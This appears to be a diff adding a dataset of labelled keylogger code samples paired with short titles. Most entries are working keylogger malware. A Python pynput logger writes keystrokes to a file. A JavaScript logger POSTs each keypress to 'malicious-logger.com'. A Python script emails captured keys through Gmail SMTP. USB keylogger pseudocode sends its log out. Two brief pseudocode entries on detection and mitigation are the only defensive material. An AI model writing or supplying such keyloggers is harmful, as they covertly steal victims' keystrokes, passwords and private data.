@@ -1,0 +1,78 @@
+[CLS] basic python keylogger [SEP]
+import pynput.keyboard
+import logging
+
+log_directory = ""
+logging.basicConfig(filename=(log_directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    logging.info(str(key))
+
+with pynput.keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+[SEP]
+
+[CLS] javascript keylogger [SEP]
+document.addEventListener('keypress', function(e) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://malicious-logger.com', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('key=' + e.key);
+});
+[SEP]
+
+[CLS] hardware keylogger detection [SEP]
+# Pseudocode for detecting potential hardware keyloggers
+devices = get_connected_devices()
+for device in devices:
+    if device.type == 'USB' and device.class == 'HID' and 'keyboard' not in device.description:
+        alert('Potential hardware keylogger detected: ' + device.id)
+[SEP]
+
+[CLS] keylogger mitigation techniques [SEP]
+# Pseudocode for keylogger mitigation
+def check_for_keyloggers(process_list):
+    for process in process_list:
+        if process.name == 'suspicious_keylogger_process':
+            terminate_process(process.id)
+
+process_list = get_running_processes()
+check_for_keyloggers(process_list)
+[SEP]
+
+[CLS] email keylogger script [SEP]
+import smtplib
+from pynput.keyboard import Key, Listener
+
+log = ""
+
+def on_press(key):
+    global log
+    log += str(key)
+
+def send_email(log):
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login('email@gmail.com', 'password')
+    server.sendmail('email@gmail.com', 'email@gmail.com', log)
+    server.quit()
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+    send_email(log)
+[SEP]
+
+[CLS] usb keylogger [SEP]
+# Pseudocode for a USB keylogger
+class USBKeylogger:
+    def __init__(self, device):
+        self.device = device
+        self.log = ""
+
+    def start(self):
+        while True:
+            input = self.device.read_input()
+            self.log += input
+            if len(self.log) > 100:
+                self.send_log()
+[SEP]
